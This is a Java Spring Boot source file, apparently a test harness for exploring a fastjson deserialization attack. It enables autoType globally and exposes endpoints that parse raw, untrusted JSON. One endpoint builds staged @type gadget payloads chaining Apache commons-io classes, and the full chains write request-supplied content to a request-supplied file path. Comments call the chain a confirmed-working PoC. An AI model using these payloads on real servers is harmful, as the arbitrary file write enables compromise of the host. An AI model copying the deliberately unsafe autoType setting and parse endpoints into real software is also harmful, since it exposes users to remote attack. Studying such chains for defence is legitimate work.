package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[BOOT] fastjson version={} autoType={}",
                com.alibaba.fastjson.util.IOUtils.class.getPackage().getImplementationVersion(),
                ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] preview={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] len={}", json.length());
            Object result = JSONObject.parseObject(json);
            log.info("[RAW] ok type={}", result == null ? "null" : result.getClass().getName());
            r.put("ok", true);
            r.put("type", result == null ? "null" : result.getClass().getSimpleName());
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[RAW-STACK] {}", sw);
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    /** 纯 Java 链（已确认可用） */
    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(new CharSequenceReader(padded), cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192]; while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
        } catch (Exception e) {
            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * 逐步诊断 fastjson 能实例化哪些类以及如何注入字段
     *
     * step=1  CharSequenceReader + 普通字符串（预期失败，确认错误类型）
     * step=2  CharSequenceReader + {"@type":"java.lang.String","content"}（逗号后裸字符串）
     * step=3  CharSequenceReader + {"@type":"java.lang.String"\n"content"}（无逗号，原始PoC语法）
     * step=4  LockableFileWriter 顶层实例化（确认可用）
     * step=5  WriterOutputStream + 内嵌 LockableFileWriter（有无AutoCloseable包装）
     * step=6  JSONObject 包裹 + $ref：LockableFileWriter -> WriterOutputStream
     * step=7  完整 JSONObject 链（input+branch+trigger）使用 step=2 的 charSequence 语法
     * step=8  完整 JSONObject 链使用 step=3 的 charSequence 语法（原始PoC）
     */
    @PostMapping("/diag/step")
    public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
        String step = body.getOrDefault("step", "1");
        String file = body.getOrDefault("file", "/tmp/step_" + step);
        String content = body.getOrDefault("content", "STEP" + step + "-OK\n");
        Map<String, Object> r = new LinkedHashMap<>();
        String json = null;
        try {
            switch (step) {
                // ── charSequence 注入格式测试 ──────────────────────────────────────
                case "1":
                    // 普通字符串（预期失败）
                    json = "{\"@type\":\"java.lang.AutoCloseable\","
                         + "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\","
                         + "\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\","
                         + "\"charSequence\":\"" + content + "\"},"
                         + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1}";
                    break;

                case "2":
                    // {"@type":"java.lang.String","content"} — 逗号后裸字符串（fastjson MiscCodec 路径）
                    json = "{\"@type\":\"java.lang.AutoCloseable\","
                         + "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\","
                         + "\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\","
                         + "\"charSequence\":{\"@type\":\"java.lang.String\",\"" + content + "\"}},"
                         + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1}";
                    break;

                case "3":
                    // {"@type":"java.lang.String"\n"content",} — 无逗号，原始PoC语法（非标准JSON）
                    json = "{\"@type\":\"java.lang.AutoCloseable\","
                         + "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\","
                         + "\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\","
                         + "\"charSequence\":{\"@type\":\"java.lang.String\"\n\"" + content + "\",}},"
                         + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1}";
                    break;

                // ── LockableFileWriter / WriterOutputStream 实例化测试 ─────────────
                case "4":
                    json = "{\"@type\":\"java.lang.AutoCloseable\","
                         + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                         + "\"file\":\"" + file + "\","
                         + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false}";
                    break;

                case "5":
                    // WriterOutputStream 内嵌 LockableFileWriter
                    json = "{\"@type\":\"java.lang.AutoCloseable\","
                         + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                         + "\"writer\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                             + "\"file\":\"" + file + "\","
                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                         + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}";
                    break;

                case "6":
                    // JSONObject 包裹：lfw 顶层，wos 通过 $ref 引用
                    json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                         + "\"lfw\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                             + "\"file\":\"" + file + "\","
                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                         + "\"wos\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                             + "\"writer\":{\"$ref\":\"$.lfw\"},"
                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}"
                         + "}";
                    break;

                // ── 完整链测试 ─────────────────────────────────────────────────────
                case "7": {
                    // 完整链：charSequence 用 step2 语法（逗号后裸字符串）
                    String pad = content + " ".repeat(Math.max(0, 8193 - content.length()));
                    json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                         + "\"lfw\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                             + "\"file\":\"" + file + "\","
                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                         + "\"wos\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                             + "\"writer\":{\"$ref\":\"$.lfw\"},"
                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
                         + "\"ris\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\","
                             + "\"reader\":{"
                                 + "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\","
                                 + "\"charSequence\":{\"@type\":\"java.lang.String\",\"" + pad + "\"}},"
                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1},"
                         + "\"tee\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                             + "\"input\":{\"$ref\":\"$.ris\"},"
                             + "\"branch\":{\"$ref\":\"$.wos\"},"
                             + "\"closeBranch\":true},"
                         + "\"xml\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                             + "\"is\":{\"$ref\":\"$.tee\"},"
                             + "\"httpContentType\":\"text/xml\","
                             + "\"lenient\":true,"
                             + "\"defaultEncoding\":\"iso-8859-1\"}"
                         + "}";
                    break;
                }

                case "8": {
                    // 完整链：charSequence 用 step3 语法（无逗号，原始PoC格式）
                    String pad = content + " ".repeat(Math.max(0, 8193 - content.length()));
                    json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                         + "\"lfw\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                             + "\"file\":\"" + file + "\","
                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                         + "\"wos\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                             + "\"writer\":{\"$ref\":\"$.lfw\"},"
                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
                         + "\"ris\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\","
                             + "\"reader\":{"
                                 + "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\","
                                 + "\"charSequence\":{\"@type\":\"java.lang.String\"\n\"" + pad + "\",}},"
                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1},"
                         + "\"tee\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                             + "\"input\":{\"$ref\":\"$.ris\"},"
                             + "\"branch\":{\"$ref\":\"$.wos\"},"
                             + "\"closeBranch\":true},"
                         + "\"xml\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                             + "\"is\":{\"$ref\":\"$.tee\"},"
                             + "\"httpContentType\":\"text/xml\","
                             + "\"lenient\":true,"
                             + "\"defaultEncoding\":\"iso-8859-1\"}"
                         + "}";
                    break;
                }

                default:
                    r.put("ok", false); r.put("msg", "step must be 1-8"); return r;
            }

            log.info("[STEP{}] json len={} preview={}", step, json.length(),
                    json.substring(0, Math.min(120, json.length())));

            Object result = JSONObject.parseObject(json);

            log.info("[STEP{}] parseObject OK, resultType={}", step,
                    result == null ? "null" : result.getClass().getName());

            // 检查文件
            File f = new File(file);
            boolean exists = f.exists();
            long size = exists ? f.length() : -1;
            log.info("[STEP{}] file={} exists={} size={}", step, file, exists, size);

            r.put("ok", true);
            r.put("resultType", result == null ? "null" : result.getClass().getSimpleName());
            r.put("fileExists", exists);
            r.put("fileSize", size);

        } catch (Exception e) {
            log.error("[STEP{}-ERR] {}:{}", step, e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[STEP{}-STACK]\n{}", step, sw);
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
            // 即使抛异常，文件可能已写入
            File f = new File(file);
            r.put("fileExists", f.exists());
            r.put("fileSize", f.exists() ? f.length() : -1);
        }
        return r;
    }
}
